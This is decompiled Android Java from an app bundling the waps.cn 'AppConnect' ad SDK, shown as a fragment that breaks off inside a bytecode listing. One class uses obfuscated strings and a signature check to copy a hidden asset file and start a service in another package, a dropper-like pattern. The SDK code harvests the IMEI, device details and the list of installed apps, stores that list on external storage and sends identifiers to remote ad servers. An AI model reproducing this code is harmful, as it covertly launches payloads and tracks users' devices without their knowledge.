    String j = "3082025d308201c6a00302010202044de7355a300d06092a864886f70d010105050030723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a69303030313020170d3131303630323037303134365a180f32313232303530363037303134365a30723111300f060355040613086b656a69303030313111300f060355040813086b656a69303030313111300f060355040713086b656a69303030313111300f060355040a13086b656a69303030313111300f060355040b13086b656a69303030313111300f060355040313086b656a693030303130819f300d06092a864886f70d010101050003818d0030818902818100b2851f2f85af5894bdfd96b10b9465dfc10bf430d66f3837bd12f2346c438f3da0c16666cc23e7ae29c1f3ce30167d32376bb170b372fb8c87439b6ce7f0c3811818d60517131ddf1cead3db2e124f918d6b5db9899dd56fa28ff933c4ed855233d5318dd3d3b4fb28b00c5b8b8cec71a74a88a011d6c8256b90ce122a4a06330203010001300d06092a864886f70d0101050500038181000d72270a1c9970897335541d64ba729568a0f535aee7c20e5397f44d410e6cf76d0f97bc495eeb8e77d2d3d3ab6fe947515f4cb10468b073bf122a4e4bcdd2e6f0a6623af3bdc9039cc8139dc4fb32c58cf55f1661b730beaa5977faea9ace72e65448a002e5bffa6de75fcf14a1c3bcfd64d385c7e6654c4e2f52e635015dae";

    Random k = new Random();

    boolean l = false;

    private int m = 3;

    private Handler n = new Collection(this);

    private void a(int paramInt) {
        Message message = new Message();
        message.what = paramInt;
        this.n.sendMessage(message);
    }

    private void c() {
        try {
            this.c.setClassName(this.a, this.b);
            h.startService(this.c);
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void d() {
        try {
            File file = new File(Amazing.a("9Ci5utjhztkp7cA_") + h.getPackageName() + Amazing.a("9Cz18t3N94nO7KTm"));
            if (file.exists())
                file.delete();
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private void e() {
        this.l = false;
        try {
            d();
            InputStream inputStream = h.getAssets().open(Amazing.a("7xBNzKFCzKFW"));
            FileOutputStream fileOutputStream = h.openFileOutput(Amazing.a("XvB5rtE_"), this.m);
            byte[] arrayOfByte = new byte[inputStream.available()];
            while (true) {
                if (inputStream.read(arrayOfByte) == -1) {
                    inputStream.close();
                    fileOutputStream.flush();
                    fileOutputStream.close();
                    this.l = true;
                    return;
                }
                fileOutputStream.write(arrayOfByte);
            }
        } catch (Exception exception) {
            return;
        }
    }

    public String a() {
        try {
            return (h.getBaseContext().getPackageManager().getPackageInfo(h.getPackageName(), 64)).signatures[0].toCharsString();
        } catch (Exception exception) {
            return null;
        }
    }

    public void a(Context paramContext, Activity paramActivity) {
        g = paramContext;
        h = paramActivity;
        if (this.j.equals(a()))
            b();
    }

    public void b() {
        int i;
        int j;
        if (Build.VERSION.RELEASE.startsWith("1.5"))
            return;
        c();
        try {
            i = (h.getPackageManager().getPackageInfo(h.getPackageName(), 0)).versionCode;
            Context context = h.createPackageContext(this.a, 2);
            Thread.sleep(500L);
            j = context.getSharedPreferences("first_app_perferences", this.m).getInt("global_b_version_id", 0);
            if (j == 0) {
                a(10);
                return;
            }
        } catch (Exception exception) {
            a(10);
            return;
        }
        if (j < i) {
            a(10);
            return;
        }
        d();
    }
}

public final class AppConnect {
    public static final String LIBRARY_VERSION_NUMBER = "1.4.1";

    private static boolean S;

    private static boolean T;

    private static String U;

    private static UpdatePointsNotifier V;

    private static String aa;

    private static String ab;

    private static String ac;

    private static AppConnect u = null;

    private static n v = null;

    private static DisplayAd w = null;

    private String A = "";

    private String B = "";

    private String C = "";

    private String D = "";

    private String E = "";

    private String F = "";

    private String G = "";

    private String H = "";

    private String I = "http://app.waps.cn/action/account/offerlist?";

    private String J = "http://app.waps.cn/action/account/ownslist?";

    private String K = "";

    private String L = "";

    private String M = "";

    private String N = "";

    private String O = "";

    private int P = 0;

    private int Q = 0;

    private String R = "";

    private f W = null;

    private i X = null;

    private g Y = null;

    private h Z = null;

    final String a = "udid";

    private int ad;

    final String b = "device_name";

    final String c = "device_type";

    final String d = "os_version";

    final String e = "country_code";

    final String f = "language";

    final String g = "app_id";

    final String h = "app_version";

    final String i = "sdk_version";

    final String j = "act";

    final String k = "userid";

    final String l = "channel";

    final String m = "points";

    final String n = "install";

    final String o = "uninstall";

    final String p = "load";

    final String q = "device_width";

    final String r = "device_height";

    private j s = null;

    private Context t = null;

    private String x = "";

    private String y = "";

    private String z = "";

    static {
        S = true;
        T = false;
        U = null;
        aa = "";
        ab = "receiver/install?";
        ac = "install";
    }

    public AppConnect() {}

    private AppConnect(Context paramContext) {
        this.L = getParams(paramContext);
        this.s = new j(this, null);
        this.s.execute((Object[])new Void[0]);
    }

    public AppConnect(Context paramContext, int paramInt) {
        this.L = getParams(paramContext);
    }

    private AppConnect(Context paramContext, String paramString) {
        this.t = paramContext;
        initMetaData();
        this.L = getParams(paramContext);
        this.L += "&userid=" + paramString;
        this.s = new j(this, null);
        this.s.execute((Object[])new Void[0]);
    }

    private void UpdateDialog(String paramString) {
        try {
            AlertDialog.Builder builder = new AlertDialog.Builder(this.t);
            builder.setTitle("新版提示");
            builder.setMessage("有新版本(" + this.R + "),是否下载?");
            builder.setPositiveButton("下载", new d(this, paramString));
            builder.setNegativeButton("下次再说", new e(this));
            builder.show();
            return;
        } catch (Exception exception) {
            return;
        }
    }

    private Document buildDocument(String paramString) {
        try {
            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(paramString.getBytes("UTF-8"));
            return documentBuilderFactory.newDocumentBuilder().parse(byteArrayInputStream);
        } catch (Exception exception) {
            return null;
        }
    }

    public static String getArea() {
        int k = 0;
        while (true) {
            if (U == null && k < 20) {
                try {
                    Thread.sleep(100L);
                    k++;
                } catch (InterruptedException interruptedException) {}
                continue;
            }
            return U;
        }
    }

    public static AppConnect getInstance(Context paramContext) {
        if (v == null) {
            v = new n();
            NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.getExtraInfo() != null && networkInfo.getExtraInfo().equals("cmwap"))
                v.a(true);
        }
        if (u == null)
            u = new AppConnect(paramContext);
        if (w == null)
            w = new DisplayAd(paramContext);
        return u;
    }

    public static AppConnect getInstance(Context paramContext, int paramInt) {
        if (v == null) {
            v = new n();
            NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.getExtraInfo() != null && networkInfo.getExtraInfo().equals("cmwap"))
                v.a(true);
        }
        if (u == null)
            u = new AppConnect(paramContext, paramInt);
        if (w == null)
            w = new DisplayAd(paramContext);
        return u;
    }

    public static AppConnect getInstance(Context paramContext, String paramString) {
        if (v == null) {
            v = new n();
            NetworkInfo networkInfo = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.getExtraInfo() != null && networkInfo.getExtraInfo().equals("cmwap"))
                v.a(true);
        }
        if (u == null)
            u = new AppConnect(paramContext, paramString);
        if (w == null)
            w = new DisplayAd(paramContext);
        return u;
    }

    public static AppConnect getInstanceNoConnect(Context paramContext) {
        if (v == null)
            v = new n();
        if (u == null)
            u = new AppConnect(paramContext, 0);
        if (w == null)
            w = new DisplayAd(paramContext);
        return u;
    }

    private String getNodeTrimValue(NodeList paramNodeList) {
        int k = 0;
        Element element = (Element)paramNodeList.item(0);
        if (element != null) {
            NodeList nodeList = element.getChildNodes();
            int m = nodeList.getLength();
            String str;
            for (str = ""; k < m; str = str1) {
                Node node = nodeList.item(k);
                String str1 = str;
                if (node != null)
                    str1 = str + node.getNodeValue();
                k++;
            }
            return (str != null && !str.equals("")) ? str.trim() : null;
        }
        return null;
    }

    private void getPointsHelper() {
        this.W = new f(this, null);
        this.W.execute((Object[])new Void[0]);
    }

    private boolean handleConnectResponse(String paramString) {
        try {
            Document document = buildDocument(paramString);
            if (document != null && document.getElementsByTagName("Version") != null) {
                paramString = getNodeTrimValue(document.getElementsByTagName("Success"));
                String str1 = getNodeTrimValue(document.getElementsByTagName("Version"));
                String str2 = getNodeTrimValue(document.getElementsByTagName("Clear"));
                String str3 = getNodeTrimValue(document.getElementsByTagName("Area"));
                if (paramString != null && paramString.equals("true")) {
                    if (str1 != null && !"".equals(str1))
                        this.R = str1;
                    if (str2 != null && !"".equals(str2.trim()))
                        T = true;
                    if (str3 != null && !"".equals(str3.trim()))
                        setArea(str3);
                    return true;
                }
            }
        } catch (Exception exception) {}
        return false;
    }

    private boolean handleGetPointsResponse(String paramString) {
        Document document = buildDocument(paramString);
        if (document != null) {
            String str = getNodeTrimValue(document.getElementsByTagName("Success"));
            if (str != null && str.equals("true")) {
                this.t.getSharedPreferences("Points", 0);
                str = getNodeTrimValue(document.getElementsByTagName("Points"));
                String str1 = getNodeTrimValue(document.getElementsByTagName("CurrencyName"));
                if (str != null && str1 != null) {
                    V.getUpdatePoints(str1, Integer.parseInt(str));
                    return true;
                }
            }
        }
        return false;
    }

    private boolean handleSpendPointsResponse(String paramString) {
        Document document = buildDocument(paramString);
        if (document != null) {
            String str1;
            String str2 = getNodeTrimValue(document.getElementsByTagName("Success"));
            if (str2 != null && str2.equals("true")) {
                str2 = getNodeTrimValue(document.getElementsByTagName("Points"));
                str1 = getNodeTrimValue(document.getElementsByTagName("CurrencyName"));
                if (str2 != null && str1 != null) {
                    V.getUpdatePoints(str1, Integer.parseInt(str2));
                    return true;
                }
            } else if (str2 != null && str2.endsWith("false")) {
                str1 = getNodeTrimValue(str1.getElementsByTagName("Message"));
                V.getUpdatePointsFailed(str1);
                return true;
            }
        }
        return false;
    }

    private void loadApps() {
        // Byte code:
        //   0: iconst_0
        //   1: istore_3
        //   2: new android/content/Intent
        //   5: dup
        //   6: ldc_w 'android.intent.action.MAIN'
        //   9: aconst_null
        //   10: invokespecial <init> : (Ljava/lang/String;Landroid/net/Uri;)V
        //   13: ldc_w 'android.intent.category.LAUNCHER'
        //   16: invokevirtual addCategory : (Ljava/lang/String;)Landroid/content/Intent;
        //   19: pop
        //   20: invokestatic getExternalStorageState : ()Ljava/lang/String;
        //   23: ldc_w 'mounted'
        //   26: invokevirtual equals : (Ljava/lang/Object;)Z
        //   29: ifeq -> 692
        //   32: new java/io/File
        //   35: dup
        //   36: new java/lang/StringBuilder
        //   39: dup
        //   40: invokespecial <init> : ()V
        //   43: invokestatic getExternalStorageDirectory : ()Ljava/io/File;
        //   46: invokevirtual toString : ()Ljava/lang/String;
        //   49: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   52: ldc_w '/Android'
        //   55: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   58: invokevirtual toString : ()Ljava/lang/String;
        //   61: invokespecial <init> : (Ljava/lang/String;)V
        //   64: astore #5
        //   66: new java/io/File
        //   69: dup
        //   70: new java/lang/StringBuilder
        //   73: dup
        //   74: invokespecial <init> : ()V
        //   77: invokestatic getExternalStorageDirectory : ()Ljava/io/File;
        //   80: invokevirtual toString : ()Ljava/lang/String;
        //   83: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   86: ldc_w '/Android/Package.dat'
        //   89: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   92: invokevirtual toString : ()Ljava/lang/String;
        //   95: invokespecial <init> : (Ljava/lang/String;)V
        //   98: astore #8
        //   100: aload #5
        //   102: invokevirtual exists : ()Z
        //   105: ifne -> 114
        //   108: aload #5
        //   110: invokevirtual mkdir : ()Z
        //   113: pop
        //   114: aload #8
        //   116: invokevirtual exists : ()Z
        //   119: ifne -> 128
        //   122: aload #8
        //   124: invokevirtual createNewFile : ()Z
        //   127: pop
        //   128: new java/io/FileInputStream
        //   131: dup
        //   132: aload #8
        //   134: invokespecial <init> : (Ljava/io/File;)V
        //   137: astore #5
        //   139: new java/io/BufferedReader
        //   142: dup
        //   143: new java/io/InputStreamReader
        //   146: dup
        //   147: aload #5
        //   149: invokespecial <init> : (Ljava/io/InputStream;)V
        //   152: invokespecial <init> : (Ljava/io/Reader;)V
        //   155: astore #6
        //   157: aload #6
        //   159: ifnull -> 685
        //   162: ldc ''
        //   164: astore #7
        //   166: aload #6
        //   168: invokevirtual readLine : ()Ljava/lang/String;
        //   171: astore #9
        //   173: aload #9
        //   175: ifnull -> 203
        //   178: new java/lang/StringBuilder
        //   181: dup
        //   182: invokespecial <init> : ()V
        //   185: aload #7
        //   187: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   190: aload #9
        //   192: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   195: invokevirtual toString : ()Ljava/lang/String;
        //   198: astore #7
        //   200: goto -> 166
        //   203: aload_0
        //   204: getfield t : Landroid/content/Context;
        //   207: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   210: iconst_0
        //   211: invokevirtual getInstalledPackages : (I)Ljava/util/List;
        //   214: astore #9
        //   216: iconst_0
        //   217: istore_2
        //   218: iload_2
        //   219: aload #9
        //   221: invokeinterface size : ()I
        //   226: if_icmpge -> 352
        //   229: aload #9
        //   231: iload_2
        //   232: invokeinterface get : (I)Ljava/lang/Object;
        //   237: checkcast android/content/pm/PackageInfo
        //   240: astore #10
        //   242: aload #10
        //   244: getfield applicationInfo : Landroid/content/pm/ApplicationInfo;
        //   247: getfield flags : I
        //   250: istore #4
        //   252: aload #10
        //   254: getfield applicationInfo : Landroid/content/pm/ApplicationInfo;
        //   257: astore #11
        //   259: iload_3
        //   260: istore_1
        //   261: iload #4
        //   263: iconst_1
        //   264: iand
        //   265: ifgt -> 708
        //   268: iload_3
        //   269: iconst_1
        //   270: iadd
        //   271: istore_3
        //   272: aload #10
        //   274: getfield packageName : Ljava/lang/String;
        //   277: astore #10
        //   279: iload_3
        //   280: istore_1
        //   281: aload #10
        //   283: ldc_w 'com.'
        //   286: invokevirtual startsWith : (Ljava/lang/String;)Z
        //   289: ifeq -> 708
        //   292: aload #10
        //   294: iconst_3
        //   295: aload #10
        //   297: invokevirtual length : ()I
        //   300: invokevirtual substring : (II)Ljava/lang/String;
        //   303: astore #10
        //   305: iload_3
        //   306: istore_1
        //   307: aload #7
        //   309: aload #10
        //   311: invokevirtual contains : (Ljava/lang/CharSequence;)Z
        //   314: ifne -> 708
        //   317: new java/lang/StringBuilder
        //   320: dup
        //   321: invokespecial <init> : ()V
        //   324: getstatic com/waps/AppConnect.aa : Ljava/lang/String;
        //   327: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   330: aload #10
        //   332: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   335: ldc_w ';'
        //   338: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   341: invokevirtual toString : ()Ljava/lang/String;
        //   344: putstatic com/waps/AppConnect.aa : Ljava/lang/String;
        //   347: iload_3
        //   348: istore_1
        //   349: goto -> 708
        //   352: getstatic com/waps/AppConnect.aa : Ljava/lang/String;
        //   355: ldc_w 'UTF-8'
        //   358: invokevirtual getBytes : (Ljava/lang/String;)[B
        //   361: astore #9
        //   363: aload #8
        //   365: ifnull -> 679
        //   368: new java/io/FileOutputStream
        //   371: dup
        //   372: aload #8
        //   374: iconst_1
        //   375: invokespecial <init> : (Ljava/io/File;Z)V
        //   378: astore #7
        //   380: aload #7
        //   382: aload #9
        //   384: invokevirtual write : ([B)V
        //   387: aload #7
        //   389: invokevirtual close : ()V
        //   392: aload #5
        //   394: invokevirtual close : ()V
        //   397: aload #6
        //   399: invokevirtual close : ()V
        //   402: return
        //   403: astore #5
        //   405: aload #5
        //   407: invokevirtual printStackTrace : ()V
        //   410: return
        //   411: astore #5
        //   413: aconst_null
        //   414: astore #8
        //   416: aconst_null
        //   417: astore #6
        //   419: aconst_null
        //   420: astore #7
        //   422: aload #5
        //   424: invokevirtual printStackTrace : ()V
        //   427: aload #6
        //   429: invokevirtual close : ()V
        //   432: aload #7
        //   434: invokevirtual close : ()V
        //   437: aload #8
        //   439: invokevirtual close : ()V
        //   442: return
        //   443: astore #5
        //   445: aload #5
        //   447: invokevirtual printStackTrace : ()V
        //   450: return
        //   451: astore #5
        //   453: aconst_null
        //   454: astore #8
        //   456: aconst_null
        //   457: astore #6
        //   459: aconst_null
        //   460: astore #7
        //   462: aload #6
        //   464: invokevirtual close : ()V
        //   467: aload #7
        //   469: invokevirtual close : ()V
        //   472: aload #8
        //   474: invokevirtual close : ()V
        //   477: aload #5
        //   479: athrow
        //   480: astore #6
        //   482: aload #6
        //   484: invokevirtual printStackTrace : ()V
        //   487: goto -> 477
        //   490: astore #8
        //   492: aconst_null
        //   493: astore #6
        //   495: aload #5
        //   497: astore #7
        //   499: aload #8
        //   501: astore #5
        //   503: aconst_null
        //   504: astore #8
        //   506: goto -> 462
        //   509: astore #8
        //   511: aload #5
        //   513: astore #7
        //   515: aload #8
        //   517: astore #5
        //   519: aconst_null
        //   520: astore #9
        //   522: aload #6
        //   524: astore #8
        //   526: aload #9
        //   528: astore #6
        //   530: goto -> 462
        //   533: astore #8
        //   535: aload #5
        //   537: astore #7
        //   539: aconst_null
        //   540: astore #9
        //   542: aload #8
        //   544: astore #5
        //   546: aload #6
        //   548: astore #8
        //   550: aload #9
        //   552: astore #6
        //   554: goto -> 462
        //   557: astore #8
        //   559: aload #5
        //   561: astore #9
        //   563: aload #8
        //   565: astore #5
        //   567: aload #6
        //   569: astore #8
        //   571: aload #7
        //   573: astore #6
        //   575: aload #9
        //   577: astore #7
        //   579: goto -> 462
        //   582: astore #5
        //   584: goto -> 462
        //   587: astore #8
        //   589: aconst_null
        //   590: astore #6
        //   592: aload #5
        //   594: astore #7
        //   596: aload #8
        //   598: astore #5
        //   600: aconst_null
        //   601: astore #8
        //   603: goto -> 422
        //   606: astore #8
        //   608: aload #5
        //   610: astore #7
        //   612: aload #8
        //   614: astore #5
        //   616: aconst_null
        //   617: astore #9
        //   619: aload #6
        //   621: astore #8
        //   623: aload #9
        //   625: astore #6
        //   627: goto -> 422
        //   630: astore #8
        //   632: aload #5
        //   634: astore #7
        //   636: aconst_null
        //   637: astore #9
        //   639: aload #8
        //   641: astore #5
        //   643: aload #6
        //   645: astore #8
        //   647: aload #9
        //   649: astore #6
        //   651: goto -> 422
        //   654: astore #8
        //   656: aload #5
        //   658: astore #9
        //   660: aload #8
        //   662: astore #5
        //   664: aload #6
        //   666: astore #8
        //   668: aload #7
        //   670: astore #6
        //   672: aload #9
        //   674: astore #7
        //   676: goto -> 422
        //   679: aconst_null
        //   680: astore #7
        //   682: goto -> 387
        //   685: ldc ''
        //   687: astore #7
        //   689: goto -> 203
        //   692: ldc ''
        //   694: astore #7
        //   696: aconst_null
        //   697: astore #6
        //   699: aconst_null
        //   700: astore #5
        //   702: aconst_null
        //   703: astore #8
        //   705: goto -> 203
        //   708: iload_2
        //   709: iconst_1
        //   710: iadd
        //   711: istore_2
        //   712: iload_1
        //   713: istore_3
        //   714: goto -> 218
        // Exception table:
        //   from	to	target	type
        //   20	114	411	java/lang/Exception
        //   20	114	451	finally
        //   114	128	411	java/lang/Exception
        //   114	128	451	finally
        //   128	139	411	java/lang/Exception
        //   128	139	451	finally
        //   139	157	587	java/lang/Exception
        //   139	157	490	finally
        //   166	173	606	java/lang/Exception
        //   166	173	509	finally
        //   178	200	606	java/lang/Exception
        //   178	200	509	finally
        //   203	216	630	java/lang/Exception
        //   203	216	533	finally
        //   218	259	630	java/lang/Exception
        //   218	259	533	finally
        //   272	279	630	java/lang/Exception
        //   272	279	533	finally
        //   281	305	630	java/lang/Exception
        //   281	305	533	finally
        //   307	347	630	java/lang/Exception
        //   307	347	533	finally
        //   352	363	630	java/lang/Exception
        //   352	363	533	finally
        //   368	380	630	java/lang/Exception
        //   368	380	533	finally
        //   380	387	654	java/lang/Exception
        //   380	387	557	finally
        //   387	402	403	java/lang/Exception
        //   422	427	582	finally
        //   427	442	443	java/lang/Exception
        //   462	477	480	java/lang/Exception
    }

    private void packageReceiverHelper() {
        this.Y = new g(this, null);
        this.Y.execute((Object[])new Void[0]);
    }

    public static void setArea(String paramString) {
        U = paramString;
    }

    private void spendPointsHelper() {
        this.X = new i(this, null);
        this.X.execute((Object[])new Void[0]);
    }

    public void finalize() {
        u = null;
    }

    public void getDisplayAd(DisplayAdNotifier paramDisplayAdNotifier) {
        String str = this.L;
        w.getDisplayAdDataFromServer("http://ads.waps.cn/action/", str, paramDisplayAdNotifier);
    }

    public String getParams(Context paramContext) {
        this.t = paramContext;
        initMetaData();
        this.L += "app_id=" + this.D + "&";
        this.L += "udid=" + this.x + "&";
        this.L += "app_version=" + this.E + "&";
        this.L += "sdk_version=" + this.F + "&";
        this.L += "device_name=" + this.y + "&";
        this.L += "device_type=" + this.z + "&";
        this.L += "os_version=" + this.A + "&";
        this.L += "country_code=" + this.B + "&";
        this.L += "language=" + this.C + "&";
        this.L += "act=" + paramContext.getPackageName() + "." + paramContext.getClass().getSimpleName();
        if (this.G != null && !"".equals(this.G)) {
            this.L += "&";
            this.L += "channel=" + this.G;
        }
        if (this.P > 0 && this.Q > 0) {
            this.L += "&";
            this.L += "device_width=" + this.P + "&";
            this.L += "device_height=" + this.Q;
        }
        return this.L.replaceAll(" ", "%20");
    }

    public void getPoints(UpdatePointsNotifier paramUpdatePointsNotifier) {
        if (u != null) {
            V = paramUpdatePointsNotifier;
            u.getPointsHelper();
        }
    }

    public void initMetaData() {
        // Byte code:
        //   0: aload_0
        //   1: getfield t : Landroid/content/Context;
        //   4: invokevirtual getPackageManager : ()Landroid/content/pm/PackageManager;
        //   7: astore #5
        //   9: aload #5
        //   11: aload_0
        //   12: getfield t : Landroid/content/Context;
        //   15: invokevirtual getPackageName : ()Ljava/lang/String;
        //   18: sipush #128
        //   21: invokevirtual getApplicationInfo : (Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
        //   24: astore #4
        //   26: aload #4
        //   28: ifnull -> 598
        //   31: aload #4
        //   33: getfield metaData : Landroid/os/Bundle;
        //   36: ifnull -> 598
        //   39: aload #4
        //   41: getfield metaData : Landroid/os/Bundle;
        //   44: ldc_w 'WAPS_ID'
        //   47: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
        //   50: astore_3
        //   51: aload_3
        //   52: ifnull -> 66
        //   55: aload_3
        //   56: astore_2
        //   57: ldc ''
        //   59: aload_3
        //   60: invokevirtual equals : (Ljava/lang/Object;)Z
        //   63: ifeq -> 78
        //   66: aload #4
        //   68: getfield metaData : Landroid/os/Bundle;
        //   71: ldc_w 'APP_ID'
        //   74: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
        //   77: astore_2
        //   78: aload_2
        //   79: ifnull -> 598
        //   82: aload_2
        //   83: ldc ''
        //   85: invokevirtual equals : (Ljava/lang/Object;)Z
        //   88: ifne -> 598
        //   91: aload_0
        //   92: aload_2
        //   93: invokevirtual trim : ()Ljava/lang/String;
        //   96: putfield D : Ljava/lang/String;
        //   99: aload_0
        //   100: aload_0
        //   101: getfield t : Landroid/content/Context;
        //   104: invokevirtual getPackageName : ()Ljava/lang/String;
        //   107: putfield K : Ljava/lang/String;
        //   110: aload #4
        //   112: getfield metaData : Landroid/os/Bundle;
        //   115: ldc_w 'CLIENT_PACKAGE'
        //   118: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
        //   121: astore_2
        //   122: aload_2
        //   123: ifnull -> 140
        //   126: aload_2
        //   127: ldc ''
        //   129: invokevirtual equals : (Ljava/lang/Object;)Z
        //   132: ifne -> 140
        //   135: aload_0
        //   136: aload_2
        //   137: putfield K : Ljava/lang/String;
        //   140: aload #4
        //   142: getfield metaData : Landroid/os/Bundle;
        //   145: ldc_w 'WAPS_PID'
        //   148: invokevirtual get : (Ljava/lang/String;)Ljava/lang/Object;
        //   151: astore_2
        //   152: aload_2
        //   153: ifnull -> 179
        //   156: aload_2
        //   157: invokevirtual toString : ()Ljava/lang/String;
        //   160: astore_2
        //   161: aload_2
        //   162: ifnull -> 179
        //   165: aload_2
        //   166: ldc ''
        //   168: invokevirtual equals : (Ljava/lang/Object;)Z
        //   171: ifne -> 179
        //   174: aload_0
        //   175: aload_2
        //   176: putfield G : Ljava/lang/String;
        //   179: aload_0
        //   180: aload #5
        //   182: aload_0
        //   183: getfield t : Landroid/content/Context;
        //   186: invokevirtual getPackageName : ()Ljava/lang/String;
        //   189: iconst_0
        //   190: invokevirtual getPackageInfo : (Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
        //   193: getfield versionName : Ljava/lang/String;
        //   196: putfield E : Ljava/lang/String;
        //   199: aload_0
        //   200: ldc_w 'android'
        //   203: putfield z : Ljava/lang/String;
        //   206: aload_0
        //   207: getstatic android/os/Build.MODEL : Ljava/lang/String;
        //   210: putfield y : Ljava/lang/String;
        //   213: aload_0
        //   214: getstatic android/os/Build$VERSION.RELEASE : Ljava/lang/String;
        //   217: putfield A : Ljava/lang/String;
        //   220: aload_0
        //   221: invokestatic getDefault : ()Ljava/util/Locale;
        //   224: invokevirtual getCountry : ()Ljava/lang/String;
        //   227: putfield B : Ljava/lang/String;
        //   230: aload_0
        //   231: invokestatic getDefault : ()Ljava/util/Locale;
        //   234: invokevirtual getLanguage : ()Ljava/lang/String;
        //   237: putfield C : Ljava/lang/String;
        //   240: aload_0
        //   241: ldc '1.4.1'
        //   243: putfield F : Ljava/lang/String;
        //   246: aload_0
        //   247: getfield t : Landroid/content/Context;
        //   250: ldc_w 'appPrefrences'
        //   253: iconst_0
        //   254: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
        //   257: astore_2
        //   258: aload #4
        //   260: getfield metaData : Landroid/os/Bundle;
        //   263: ldc_w 'DEVICE_ID'
        //   266: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
        //   269: astore_3
        //   270: aload_3
        //   271: ifnull -> 378
        //   274: aload_3
        //   275: ldc ''
        //   277: invokevirtual equals : (Ljava/lang/Object;)Z
        //   280: ifne -> 378
        //   283: aload_0
        //   284: aload_3
        //   285: putfield x : Ljava/lang/String;
        //   288: new android/util/DisplayMetrics
        //   291: dup
        //   292: invokespecial <init> : ()V
        //   295: astore_3
        //   296: aload_0
        //   297: getfield t : Landroid/content/Context;
        //   300: ldc_w 'window'
        //   303: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
        //   306: checkcast android/view/WindowManager
        //   309: invokeinterface getDefaultDisplay : ()Landroid/view/Display;
        //   314: aload_3
        //   315: invokevirtual getMetrics : (Landroid/util/DisplayMetrics;)V
        //   318: aload_0
        //   319: aload_3
        //   320: getfield widthPixels : I
        //   323: putfield P : I
        //   326: aload_0
        //   327: aload_3
        //   328: getfield heightPixels : I
        //   331: putfield Q : I
        //   334: aload_0
        //   335: aload_2
        //   336: ldc_w 'PrimaryColor'
        //   339: iconst_0
        //   340: invokeinterface getInt : (Ljava/lang/String;I)I
        //   345: putfield ad : I
        //   348: aload_2
        //   349: ldc_w 'InstallReferral'
        //   352: aconst_null
        //   353: invokeinterface getString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   358: astore_2
        //   359: aload_2
        //   360: ifnull -> 598
        //   363: aload_2
        //   364: ldc ''
        //   366: invokevirtual equals : (Ljava/lang/Object;)Z
        //   369: ifne -> 598
        //   372: aload_0
        //   373: aload_2
        //   374: putfield M : Ljava/lang/String;
        //   377: return
        //   378: aload_0
        //   379: getfield t : Landroid/content/Context;
        //   382: ldc_w 'phone'
        //   385: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
        //   388: checkcast android/telephony/TelephonyManager
        //   391: astore_3
        //   392: aload_3
        //   393: ifnull -> 586
        //   396: aload_0
        //   397: aload_3
        //   398: invokevirtual getDeviceId : ()Ljava/lang/String;
        //   401: putfield x : Ljava/lang/String;
        //   404: aload_0
        //   405: getfield x : Ljava/lang/String;
        //   408: ifnull -> 421
        //   411: aload_0
        //   412: getfield x : Ljava/lang/String;
        //   415: invokevirtual length : ()I
        //   418: ifne -> 428
        //   421: aload_0
        //   422: ldc_w '0'
        //   425: putfield x : Ljava/lang/String;
        //   428: aload_0
        //   429: aload_0
        //   430: getfield x : Ljava/lang/String;
        //   433: invokevirtual toLowerCase : ()Ljava/lang/String;
        //   436: putfield x : Ljava/lang/String;
        //   439: aload_0
        //   440: getfield x : Ljava/lang/String;
        //   443: invokestatic parseInt : (Ljava/lang/String;)I
        //   446: invokestatic valueOf : (I)Ljava/lang/Integer;
        //   449: invokevirtual intValue : ()I
        //   452: ifne -> 288
        //   455: new java/lang/StringBuffer
        //   458: dup
        //   459: invokespecial <init> : ()V
        //   462: astore_3
        //   463: aload_3
        //   464: ldc_w 'EMULATOR'
        //   467: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   470: pop
        //   471: aload_2
        //   472: ldc_w 'emulatorDeviceId'
        //   475: aconst_null
        //   476: invokeinterface getString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
        //   481: astore #4
        //   483: aload #4
        //   485: ifnull -> 603
        //   488: aload #4
        //   490: ldc ''
        //   492: invokevirtual equals : (Ljava/lang/Object;)Z
        //   495: ifne -> 603
        //   498: aload_0
        //   499: aload #4
        //   501: putfield x : Ljava/lang/String;
        //   504: goto -> 288
        //   507: iload_1
        //   508: bipush #32
        //   510: if_icmpge -> 542
        //   513: aload_3
        //   514: ldc_w '1234567890abcdefghijklmnopqrstuvw'
        //   517: invokestatic random : ()D
        //   520: ldc2_w 100.0
        //   523: dmul
        //   524: d2i
        //   525: bipush #30
        //   527: irem
        //   528: invokevirtual charAt : (I)C
